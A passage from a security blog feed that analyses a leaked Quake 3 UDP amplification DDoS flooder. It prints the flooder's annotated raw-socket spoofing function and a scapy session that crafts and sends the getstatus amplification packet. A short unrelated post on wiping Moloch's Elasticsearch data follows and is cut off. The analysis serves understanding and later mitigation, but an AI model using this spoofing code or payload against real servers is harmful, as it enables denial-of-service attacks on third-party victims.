</span><span class='line'>|     sv_minPing: 0
</span><span class='line'>|     sv_minRate: 0
</span><span class='line'>|_    sv_privateClients: 0
</span><span class='line'>Service Info: OS: Linux
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 0.15 seconds
</span></code></pre></td></tr></table></div></figure>


<h2>Analyzing attackers script</h2>

<p>Commonly used scripts for this kind of attacks has been leaked repeatedly so i&#8217;m not going to hide it (regardless of the fact those who DDoS already have it or more powerful attack vectors), so <a href="http://blog.alejandronolla.com/images/upload/2013/06/udp.c">here</a> is a C Quake 3 amplification flooder made upon a generic UDP flooder.</p>

<p>It&#8217;s interesting the way UDP datagrams are assembled, so let&#8217;s go to analyze it (thanks to <a href="https://twitter.com/NighterMan">NighterMan‎</a> for helping me with my rusted C knowledge), i have made some comments below about found mistakes, particularly at networking knowledge (the tool doesn&#8217;t even work rigth to trigger amplified response):</p>

<figure class='code'><figcaption><span>Quake 3 DDoS amplification attack function</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">[...]</span>
</span><span class='line'><span class="c1">// this is the UDP payload for &quot;geststatus&quot; message</span>
</span><span class='line'><span class="n">param</span><span class="p">.</span><span class="n">message</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\xFF\xFF\xFF\xFF\x67\x65\x74\x73\x74\x61\x74\x75\x73\x10</span><span class="s">&quot;</span><span class="p">;</span>
</span><span class='line'><span class="p">[...]</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm">attack function is called with following args, being params-&gt;list[i].ip and params-&gt;list[i].port Quake 3 server data</span>
</span><span class='line'><span class="cm">attack(params-&gt;victim_ip, rand() % 65534 + 1, params-&gt;list[i].ip, params-&gt;list[i].port, params-&gt;message);</span>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="n">attack</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">srcip</span><span class="p">,</span> <span class="kt">int</span> <span class="n">srcport</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">destip</span><span class="p">,</span> <span class="kt">int</span> <span class="n">destport</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">message</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="cm">/*</span>
</span><span class='line'><span class="cm">    When sending TCP/UDP segments/datagrams with raw sockets we need a pseudo header to calculate checksum value,</span>
</span><span class='line'><span class="cm">    not used in this case and probably forgot when ripping it from this SYN flooder</span>
</span><span class='line'><span class="cm">    https://gist.github.com/z0mbiehunt3r/5790220</span>
</span><span class='line'><span class="cm">    */</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">pseudo_header</span> <span class="n">psh</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
</span><span class='line'>    <span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">destport</span><span class="p">);</span>
</span><span class='line'>    <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">destip</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">memset</span> <span class="p">(</span><span class="n">packet</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="cm">/*</span>
</span><span class='line'><span class="cm">    To read more about Internet Header Length and Type Of Service check rfc791</span>
</span><span class='line'><span class="cm">    https://tools.ietf.org/html/rfc791#page-11</span>
</span><span class='line'><span class="cm">    */</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">ihl</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">version</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="cm">/*</span>
</span><span class='line'><span class="cm">    Actually ToS field in IP header is made up of a six bit &quot;Differentiated services field&quot;</span>
</span><span class='line'><span class="cm">    and two bit &quot;Explicit Congestion Notification&quot; field.</span>
</span><span class='line'><span class="cm">    </span>
</span><span class='line'><span class="cm">    Read http://tools.ietf.org/html/rfc2474 and http://tools.ietf.org/html/rfc3168 about them</span>
</span><span class='line'><span class="cm">    </span>
</span><span class='line'><span class="cm">    Explicit Congestion Notification set as a Not ECN-Capable Transport, probably with intention</span>
</span><span class='line'><span class="cm">    of bypassing/messing around congestion mitigation mechanisms ;)</span>
</span><span class='line'><span class="cm">    */</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">tos</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">tot_len</span> <span class="o">=</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">ip</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">udphdr</span><span class="p">)</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">message</span><span class="p">);</span>
</span><span class='line'>    <span class="c1">// htonl will produce a long instead of a short (IPID value is 16 bits), kernel will fix this value</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">id</span> <span class="o">=</span> <span class="n">htonl</span> <span class="p">(</span><span class="mi">54321</span><span class="p">);</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">frag_off</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">ttl</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">protocol</span> <span class="o">=</span> <span class="n">IPPROTO_UDP</span><span class="p">;</span>
</span><span class='line'>    <span class="c1">// rely IP header checksum to kernel</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">check</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">saddr</span> <span class="o">=</span> <span class="n">srcip</span><span class="p">;</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">daddr</span> <span class="o">=</span> <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">udph</span><span class="o">-&gt;</span><span class="n">source</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">srcport</span><span class="p">);</span>
</span><span class='line'>    <span class="n">udph</span><span class="o">-&gt;</span><span class="n">dest</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">destport</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="cm">/*</span>
</span><span class='line'><span class="cm">    As specified at rfc768: &quot;Length is the length in octets of this user datagram including this header</span>
</span><span class='line'><span class="cm">    and the data. (This  means  the minimum value of the length is eight.)&quot;</span>
</span><span class='line'><span class="cm">    </span>
</span><span class='line'><span class="cm">    Above is UDP length computed withoud having in mind UDP payload, so it will be wrong, DPI and protocol </span>
</span><span class='line'><span class="cm">    anomaly detection are more than welcome ;)</span>
</span><span class='line'><span class="cm">    </span>
</span><span class='line'><span class="cm">    Additionally, specifying a bad UDP length have an important side effect in this flooder, it won&#39;t work</span>
</span><span class='line'><span class="cm">    because upper layers are not going to receive correct payload, in this case quake3 server will answer</span>
</span><span class='line'><span class="cm">    with a disconnect command instead of server&#39; status, so no amplification</span>
</span><span class='line'><span class="cm">    */</span>
</span><span class='line'>    <span class="n">udph</span><span class="o">-&gt;</span><span class="n">len</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">udphdr</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>    <span class="cm">/*</span>
</span><span class='line'><span class="cm">    As specified at rfc768: &quot;An all zero  transmitted checksum  value means that the transmitter</span>
</span><span class='line'><span class="cm">    generated  no checksum  (for debugging or for higher level protocols that don&#39;t care).&quot;</span>
</span><span class='line'><span class="cm">    </span>
</span><span class='line'><span class="cm">    could be useful sometimes when defining attacking patterns</span>
</span><span class='line'><span class="cm">    */</span>
</span><span class='line'>  <span class="n">udph</span><span class="o">-&gt;</span><span class="n">check</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">strncpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">udph</span> <span class="o">+</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">udphdr</span><span class="p">),</span><span class="n">message</span><span class="p">,</span> <span class="mi">4096</span> <span class="o">-</span> <span class="p">(</span><span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">udphdr</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">ip</span><span class="p">)));</span>
</span><span class='line'>  
</span><span class='line'>  <span class="kt">int</span> <span class="n">one</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>  <span class="k">const</span> <span class="kt">int</span> <span class="o">*</span><span class="n">val</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">one</span><span class="p">;</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">setsockopt</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">IPPROTO_IP</span><span class="p">,</span> <span class="n">IP_HDRINCL</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">one</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;[x] Cannot set socket options (are we r00t?)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="k">return</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">sendto</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">packet</span><span class="p">,</span> <span class="n">iph</span><span class="o">-&gt;</span><span class="n">tot_len</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">sin</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>      <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;[x] Error sending packet</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">close</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>There isn&#8217;t much more to say about this, just highlight the fact that using htonl() instead of htons() avoid us using fixed IP ID value when finding an attack pattern. Also found interesting the specified IP ToS value to mess around with congestion detection and avoidance mechanisms, but contrasts with some mistakes that make easier to spot attacking datagrams generated by this tool and, even more unvelievable, incorrect UDP length transform amplification attack just in a plain UDP spoofed attack (probably made some copy paste from here and there), seems some guys need to read a bit about network protocols before playing with DDoS tools&#8230;</p>

<h2>Crafting Quake 3 amplification attack packet with Scapy</h2>

<p>Probably the quick and easiest way to craft packets when doing network tests is <a href="http://www.secdev.org/projects/scapy/">Scapy</a>, a python tool to create and manipulate network packets that can be used within his own interactive shell or just as a python package.</p>

<p>Below is an example for crafting this kind of attack with scapy, without spoofing IP address (we want to check answer) and with a correct UDP length value and checksum (scapy will automagically compute values like length and checksum prior of sending any packet):</p>

<figure class='code'><figcaption><span>crafting Quake 3 amplification attack packet with scapy</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># scapy</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">random</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">ip</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s">&quot;QUAKE3_SERVER_IP&quot;</span><span class="p">,</span> <span class="n">ihl</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">tos</span><span class="o">=</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">ttl</span><span class="o">=</span><span class="mi">255</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xFFFF</span><span class="p">))</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">udp</span> <span class="o">=</span> <span class="n">UDP</span><span class="p">(</span><span class="n">sport</span><span class="o">=</span><span class="mi">32511</span><span class="p">,</span> <span class="n">dport</span><span class="o">=</span><span class="mi">27960</span><span class="p">)</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">quake3_payload</span> <span class="o">=</span> <span class="s">&#39;</span><span class="se">\xFF\xFF\xFF\xFF\x67\x65\x74\x73\x74\x61\x74\x75\x73\x10</span><span class="s">&#39;</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">packet</span> <span class="o">=</span> <span class="n">ip</span><span class="o">/</span><span class="n">udp</span><span class="o">/</span><span class="n">quake3_payload</span> <span class="c"># encapsulate them</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">packet</span><span class="o">.</span><span class="n">show2</span><span class="p">()</span>
</span><span class='line'><span class="c">###[ IP ]###</span>
</span><span class='line'>  <span class="n">version</span><span class="o">=</span> <span class="il">4L</span>
</span><span class='line'>  <span class="n">ihl</span><span class="o">=</span> <span class="il">5L</span>
</span><span class='line'>  <span class="n">tos</span><span class="o">=</span> <span class="mh">0x10</span>
</span><span class='line'>  <span class="nb">len</span><span class="o">=</span> <span class="mi">42</span>
</span><span class='line'>  <span class="nb">id</span><span class="o">=</span> <span class="mi">5944</span>
</span><span class='line'>  <span class="n">flags</span><span class="o">=</span>
</span><span class='line'>  <span class="n">frag</span><span class="o">=</span> <span class="il">0L</span>
</span><span class='line'>  <span class="n">ttl</span><span class="o">=</span> <span class="mi">255</span>
</span><span class='line'>  <span class="n">proto</span><span class="o">=</span> <span class="n">udp</span>
</span><span class='line'>  <span class="n">chksum</span><span class="o">=</span> <span class="mh">0xe0a9</span>
</span><span class='line'>  <span class="n">src</span><span class="o">=</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.39</span>
</span><span class='line'>  <span class="n">dst</span><span class="o">=</span> <span class="n">QUAKE3_SERVER_IP</span>
</span><span class='line'>  \<span class="n">options</span>\
</span><span class='line'><span class="c">###[ UDP ]###</span>
</span><span class='line'>     <span class="n">sport</span><span class="o">=</span> <span class="mi">32511</span>
</span><span class='line'>     <span class="n">dport</span><span class="o">=</span> <span class="mi">27960</span>
</span><span class='line'>     <span class="nb">len</span><span class="o">=</span> <span class="mi">22</span>
</span><span class='line'>     <span class="n">chksum</span><span class="o">=</span> <span class="mh">0x17f9</span>
</span><span class='line'><span class="c">###[ Raw ]###</span>
</span><span class='line'>        <span class="n">load</span><span class="o">=</span> <span class="s">&#39;</span><span class="se">\xff\xff\xff\xff</span><span class="s">getstatus</span><span class="se">\x10</span><span class="s">&#39;</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">response</span> <span class="o">=</span> <span class="n">sr1</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
</span><span class='line'><span class="n">Begin</span> <span class="n">emission</span><span class="p">:</span>
</span><span class='line'><span class="n">Finished</span> <span class="n">to</span> <span class="n">send</span> <span class="mi">1</span> <span class="n">packets</span><span class="o">.</span>
</span><span class='line'><span class="o">*</span>
</span><span class='line'><span class="n">Received</span> <span class="mi">1</span> <span class="n">packets</span><span class="p">,</span> <span class="n">got</span> <span class="mi">1</span> <span class="n">answers</span><span class="p">,</span> <span class="n">remaining</span> <span class="mi">0</span> <span class="n">packets</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">response</span><span class="o">.</span><span class="n">payload</span><span class="o">.</span><span class="n">payload</span><span class="o">.</span><span class="n">show2</span><span class="p">()</span>
</span><span class='line'><span class="c">###[ Raw ]###</span>
</span><span class='line'>  <span class="n">load</span><span class="o">=</span> <span class="s">&#39;</span><span class="se">\xff\xff\xff\xff</span><span class="s">statusResponse</span><span class="se">\n\\</span><span class="s">sv_allowdownload</span><span class="se">\\</span><span class="s">0</span><span class="se">\\</span><span class="s">g_matchmode</span><span class="se">\\</span><span class="s">0</span><span class="se">\\</span><span class="s">g_gametype</span><span class="se">\\</span><span class="s">3</span><span class="se">\\</span><span class="s">sv_maxclients</span><span class="se">\\</span><span class="s">32</span><span class="se">\\</span><span class="s">sv_floodprotect</span><span class="se">\\</span><span class="s">1</span><span class="se">\\</span><span class="s">capturelimit</span><span class="se">\\</span><span class="s">0</span><span class="se">\\</span><span class="s">[...]</span><span class="se">\n</span><span class="s">0 0 &quot;Chuck-Norris&quot;</span><span class="se">\n</span><span class="s">0 250 &quot;b0b0&quot;[...]</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>If you have never used scapy before take a look to this <a href="http://code.google.com/p/scapy-guide/downloads/list">scapy-guide</a> made by <a href="https://twitter.com/catalyst256/">Adam Maxwell</a>, it&#8217;s really useful as a first-steps guide.</p>

<h2>How does it looks like at network level?</h2>

<p>Ok, so we have readed flooder code and referenced rfc sections (because we did, right? ;) ), time to sniff some attack traffic and analyze it with tshark/wireshark and observe described behaviour pattern.</p>

<p>First, i have compiled and used &#8220;dns.c&#8221; flooder without making any kind of modification, this is a Wireshak screenshot while analyzing it:<br/>
<img src="http://blog.alejandronolla.com/images/upload/2013/06/incorrectlength_client.png"></p>

<p>I have marked in red important aspects like ToS/DS field, UDP length/checksum and &#8220;direction&#8221; (for Quake 3 protocol). As shown, Wireshark Quake 3 protocol <a href="http://anonsvn.wireshark.org/wireshark/trunk/epan/dissectors/packet-quake3.c">dissector</a> itself detect it as a malformed packet, due to UDP length = 8 application layer will receive an empty payload, fact that the Q3 server will treat as a client with connectivity errors and will send a &#8220;disconnect&#8221; message:<br/>
<img src="http://blog.alejandronolla.com/images/upload/2013/06/incorrectlength_server.png"></p>

<p>If we compare question size against response answer there is no amplification factor at all, this program would be useful only for provoking Q3 servers sending unsolicited traffic to a third host - the attacked one - with the intention of splitting originating AS-path attacking or something similar.</p>

<p>I have sent one &#8220;getstatus&#8221; request forged with scapy to a public Quake 3 server (for obvious reasons i have changed some response content):<br/>
<img src="http://blog.alejandronolla.com/images/upload/2013/06/statusResponse.png"></p>

<p>The server now correctly decode UDP payload, process &#8220;getstatus&#8221; command and answer with server status, including several server options and config values as well as statistics (a response size of 1373 bytes for a 56 bytes request).</p>

<h2>Next steps</h2>

<p>So far we have seen how this attack works as well as (bad coded) programs being used in the wild to launch DDoS attacks from web panels (the so called DDoS booters). We have also seen how to replay the amplification attack with Scapy and analized a bit of this network traffic with Wireshark.</p>

<p>At the next post we are going to see how to mitigate this kind of attack at the Quake 3 server - at application and network layer - side and also from the victim side being flooded. Also we are going to analyze it deeper with tshark to see potential ways to spot this attack and try to block it.</p>

<p>See you at next post!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Moloch: Erasing data and restore database]]></title>
    <link href="http://blog.alejandronolla.com/2013/05/29/moloch-erasing-data-and-restore-database/"/>
    <updated>2013-05-29T13:31:00+02:00</updated>
    <id>http://blog.alejandronolla.com/2013/05/29/moloch-erasing-data-and-restore-database</id>
    <content type="html"><![CDATA[<p>This post is just a quick tip for restoring moloch state (database and pcap data) to have a superb fresh installed moloch system. I have received and email asking for this, so maybe it could be useful for someone. If you don&#8217;t know what moloch is take a look to his <a href="https://github.com/aol/moloch">github</a> and my previous <a href="http://blog.alejandronolla.com/2013/04/06/moloch-capturing-and-indexing-network-traffic-in-realtime/">post</a> to know more about this powerful network traffic capturer and indexer distributed system. <!-- more --></p>

<h2>Restoring elasticsearch schema and indexed data</h2>

<p>First, we need to erase indexed data and, optionally, also user data, to do this moloch includes a perl script for managing database:</p>

<figure class='code'><figcaption><span>moloch database management options</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>~/moloch/db# ./db.pl
</span><span class='line'>
</span><span class='line'>Missing arguments
</span><span class='line'>
</span><span class='line'>./db.pl &lt;ESHOST:ESPORT&gt; &lt;<span class="nb">command</span>&gt; <span class="o">[</span>&lt;options&gt;<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Commands:
</span><span class='line'>  init                  - Clear ALL elasticsearch moloch data and create schema
</span><span class='line'>  wipe                  - Same as init, but leaves user database untouched
</span><span class='line'>  upgrade               - Upgrade Moloch<span class="err">&#39;</span>s schema in elasticsearch from previous versions
</span><span class='line'>  usersexport &lt;fn&gt;      - Save the users info to &lt;fn&gt;
</span><span class='line'>  usersimport &lt;fn&gt;      - Load the users info from &lt;fn&gt;
</span><span class='line'>  rotate &lt;<span class="nb">type</span>&gt; &lt;num&gt;   - Perform daily maintenance
</span><span class='line'>       <span class="nb">type</span>             - Same as rotateIndex in ini <span class="nv">file</span> <span class="o">=</span> daily,weekly,monthly
</span><span class='line'>       num              - number indexes to keep
</span></code></pre></td></tr></table></div></figure>


<p>So, if we want to restore database state - users included - we have to do the following:</p>

<figure class='code'><figcaption><span>restoring moloch&#8217;s elastic search data</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>~/moloch/db# ./db.pl ELASTICSEARCH_IP:9200 init
</span><span class='line'>It is STRONGLY recommended that you stop ALL moloch captures and viewers before proceeding.
</span><span class='line'>
</span><span class='line'>There is 1 elastic search node, <span class="k">if </span>you expect more please fix first before proceeding.
</span><span class='line'>
</span><span class='line'>It appears this elastic search cluster already has moloch installed, this will delete ALL data in elastic search! <span class="o">(</span>It does not delete the pcap files on disk.<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Type <span class="s2">&quot;INIT&quot;</span> to <span class="k">continue</span> - <span class="k">do </span>you want to erase everything?
</span><span class='line'>INIT
</span><span class='line'>Erasing
</span><span class='line'>Creating
</span><span class='line'>Finished.  Have fun!
</span></code></pre></td></tr></table></div></figure>


<p>Now elastic search only have basic schema (with users database restored); to know more about what db.pl have done take a look to his source code:</p>

<figure class='code'><figcaption><span>moloch database management source code</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
